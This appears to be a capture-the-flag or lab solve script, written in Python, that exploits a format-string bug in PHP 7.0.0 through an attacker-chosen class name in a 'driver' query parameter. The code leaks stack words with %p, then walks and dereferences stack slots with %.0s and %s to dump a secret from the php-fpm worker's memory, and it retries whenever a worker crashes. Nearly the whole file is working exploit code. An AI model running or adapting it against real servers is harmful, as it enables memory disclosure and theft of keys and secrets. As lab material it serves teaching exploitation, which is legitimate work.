#!/usr/bin/env python3
"""
Automated exploit for lab 03 - Format-String Oriented Programming.

Recreates Orange Tsai's "Format-String Oriented Programming" from Phrack #72
section 1.1, built on Andrew's PHP bug #71105.

The target does two attacker-controlled things on the same line:

    $probe = new $driver();      // arbitrary object instantiation

When $driver names a class that does not exist, PHP 7.0.0 (and *only* 7.0.0)
builds the fatal-error message with:

    zend_throw_error(NULL, "Class '%s' not found", class_name);   // <-- fixed
    zend_throw_or_error(..., "Class '%s' not found", class_name);

but the uncaught-error printer eventually feeds the *rendered* class name back
into PHP's own printf (main/spprintf.c) as a FORMAT STRING. So a class name of
"%p" is not looked up as a class - it is interpreted as a conversion and leaks
a machine word off the stack.

We never get a file-read primitive here. The flag lives only in the licence
blob that index.php builds in memory before the vulnerable line. We pull it
straight out of the php-fpm worker's stack with the format string:

    stage 1  %p|%p|...     leak raw stack words (proof the primitive works)
    stage 2  %.0s * n + %s  walk n stack slots without dereferencing, then
                            dereference slot n as a C string. When slot n
                            happens to hold the pointer to the licence text,
                            %s prints the whole blob - flag included.

Every %s that lands on a non-pointer word segfaults the worker (HTTP 502).
That is expected: php-fpm respawns the worker, so we just retry / move on.

Python 3 stdlib only. Usage: solve.py [base_url]   (default http://challenge)
"""
import re
import sys
import time
import urllib.parse
import urllib.request

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://challenge").rstrip("/")
FLAG_RE = re.compile(r"PHRACK\{[^}]*\}")
LICENCE_MARK = "BEGIN FLEET LICENCE"
MAX_SLOT = 24            # how deep into the stack we are willing to walk
RETRIES = 4              # a slot can 502 (worker segfault) - retry a few times


def request(driver, timeout=8):
    """Send one ?driver=<payload> request. Returns (status, body)."""
    qs = urllib.parse.urlencode({"driver": driver})
    url = "%s/?%s" % (BASE, qs)
    req = urllib.request.Request(url, headers={"User-Agent": "fsop-solver"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read().decode("latin-1", "replace")
    except urllib.error.HTTPError as e:
        # php-fpm worker crashed mid-request -> nginx answers 502/504
        return e.code, e.read().decode("latin-1", "replace")
    except Exception as e:                       # noqa: BLE001
        return 0, "<transport error: %s>" % e


def wait_up():
    print("[*] waiting for %s to answer ..." % BASE)
    for _ in range(90):
        st, body = request("NullDriver")
        if st == 200 and "fleet-console" in body:
            print("[+] target is up: %s" % body.splitlines()[0])
            return True
        time.sleep(1)
    print("[!] target never became healthy")
    return False


def stage1_leak_stack():
    """Leak a row of raw stack words - the classic %p read primitive."""
    print("\n[*] stage 1: leaking stack words with %p (bug #71105)")
    payload = "|".join(["%p"] * 12)
    st, body = request(payload)
    line = next((l for l in body.splitlines() if "not found" in l), body[:200])
    m = re.search(r"Class '([^']*)' not found", line)
    words = m.group(1).split("|") if m else []
    for i, w in enumerate(words):
        print("      slot %2d = %s" % (i, w))
    if not any(w.startswith("0x7f") or w.startswith("0x5") for w in words):
        print("[!] no pointer-looking words leaked - is this really PHP 7.0.0?")
    else:
        print("[+] format string is live: attacker input is a printf format")
    return words


def stage2_dump_licence():
    """Walk the stack with %.0s (no deref) then %s (deref) to dump the blob."""
    print("\n[*] stage 2: dereferencing stack slots with %.0s*n + %s")
    for slot in range(MAX_SLOT):
        # %.0s advances one va_arg with strnlen(s,0) -> never touches memory
        payload = ("%.0s" * slot) + "%s"
        for attempt in range(RETRIES):
            st, body = request(payload)
            if LICENCE_MARK in body or FLAG_RE.search(body):
                flag = FLAG_RE.search(body)
                if flag:
                    print("[+] slot %d holds the licence pointer; %%s dumped it"
                          % slot)
                    return flag.group(0)
                # licence text but no flag on this read - keep the slot noted
                print("[*] slot %d -> licence text (no flag in window)" % slot)
                break
            if st == 502 or st == 504 or st == 0:
                # worker segfaulted on a bad pointer; give it a moment to respawn
                time.sleep(0.3)
                continue
            break
    return None


def main():
    if not wait_up():
        return 1
    stage1_leak_stack()
    flag = stage2_dump_licence()
    if not flag:
        print("\n[!] could not recover the flag")
        return 1
    print("\n[+] recovered the node deploy key straight from process memory")
    print("FLAG: %s" % flag)
    return 0


if __name__ == "__main__":
    sys.exit(main())
